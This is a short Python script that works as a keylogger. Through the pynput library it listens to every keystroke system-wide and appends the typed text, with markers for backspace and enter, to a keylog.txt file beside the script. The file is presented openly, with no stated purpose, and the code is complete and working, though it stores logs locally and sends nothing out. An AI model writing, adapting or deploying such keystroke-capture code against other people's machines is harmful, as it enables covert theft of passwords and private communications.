import pynput 
import os 

keyboard = pynput.keyboard
script_dir = os.path.dirname(os.path.abspath(__file__))
key_buffer = []

# Configuration
key_logs_file_path = os.path.join(script_dir, "keylog.txt")

def combined_keys_in_list(list: list):
    return "".join(list)
    
def save_in_key_log_file(combined_letter_in_list, with_whitespace=False):
    with open(key_logs_file_path, "a") as file:
        file.write(combined_letter_in_list)
        if with_whitespace:
            file.write("\n")   
            
def on_press(key):
    pass
    
def on_release(key):
    buttkey = keyboard.Key
    with_whitespace = True
    if hasattr(key, 'char') and key.char:
        key_str = key.char
    else:
        key_str = str(key)
    if key in (buttkey.backspace, buttkey.space, buttkey.enter, buttkey.esc, buttkey.cmd):
        if key == buttkey.space:
            key_str = " "
            with_whitespace = False
        elif key == buttkey.backspace:
            key_str = " /(backspace)"
        elif key == buttkey.enter:
            key_str = " /(enter)"
        key_buffer.append(key_str)
        result = combined_keys_in_list(key_buffer)
        save_in_key_log_file(result, with_whitespace)
        key_buffer.clear()
    else:
        key_buffer.append(key_str)

listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release
)

listener.start()
input("")
